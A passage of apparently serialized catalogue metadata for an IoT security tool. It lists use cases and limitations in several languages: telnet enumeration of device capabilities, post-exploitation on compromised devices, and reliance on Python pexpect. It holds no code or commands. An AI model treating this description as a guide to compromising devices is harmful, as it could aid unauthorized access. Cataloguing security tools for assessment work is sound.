comprometidos"],"fr":["Automatiser les évaluations de vulnérabilités des dispositifs IoT","Énumérer les capacités des dispositifs via telnet","Effectuer des activités post-exploitation sur les dispositifs compromis"],"de":["Automatisierung von IoT-Geräte-Schwachstellenbewertungen","Auflisten von Gerätefunktionen über telnet","Durchführung von postexploitativen Aktivitäten auf kompromittierten Geräten"],"pt":["Automatizar avaliações de vulnerabilidades de dispositivos IoT","Enumerar capacidades de dispositivos via telnet","Realizar atividades pós-exploração em dispositivos comprometidos"],"ru":["Автоматизировать оценку уязвимостей устройств IoT","Перечислять возможности устройств через telnet","Проводить пост-эксплуатационные действия на скомпрометированных устройствах"],"ar":["تحسين تقييمات ضعف أجهزة IoT","تحديد إمكانيات الجهاز عبر telnet","إجراء أنشطة ما بعد الاستغلال على الأجهزة المخترقة"]},"limitations":{"en":["Requires Python 3 with pexpect library","Needs telnet client installed on the system","Dependent on network access to the target device"],"zh":["需要 Python 3 和 pexpect 库","需要在系统上安装 telnet 客户端","依赖于对目标设备的网络访问"],"ja":["Python 3 と pexpect ライブラリが必要","システムに telnet クライアントをインストールする必要があります","対象デバイスへのネットワーク アクセスに依存"],"ko":["Python 3 및 pexpect 라이브러리가 필요합니다","시스템에 텔넷 클라이언트를 설치해야 합니다","대상 장치에 대한 네트워크 액세스에 의존합니다"],"es":["Requiere Python 3 con biblioteca pexpect","Necesita cliente telnet instalado en el sistema","Depende del acceso a la red al dispositivo objetivo"],"fr":["Nécessite Python 3 avec bibliothèque pexpect","Nécessite un client telnet installé sur le système","Dépend de l''accès au réseau au dispositif cible"],"de":["Benötigt Python 3 mit pexpect-Bibliothek","Benötigt telnet-Client auf dem System","Abhängig vom Netzwerkzugriff auf das Zielgerät"],"pt":["Exige Python 3 com biblioteca pexpect","Necessita de cliente telnet instalado no sistema","Depende do acesso de rede ao dispositivo de destino"],"ru":["Требует Python 3 с библиотекой pexpect","Требует установленного клиента telnet в системе","Зависит от сетевого доступа к целевому устройству"],"ar":["يتطلب Python 3 مع مكتبة pexpect","يحتاج إلى تثبيت عميل telnet على النظام","يعتمد على الوصول إلى الشبكة إلى الجهاز المستهدف"]},"version":4},"contentHash":"cbc6597f7298e38d412c457f50a3d2d652fe7f2741e11b3ca4330b6044b349a2","qualityScore":60}');
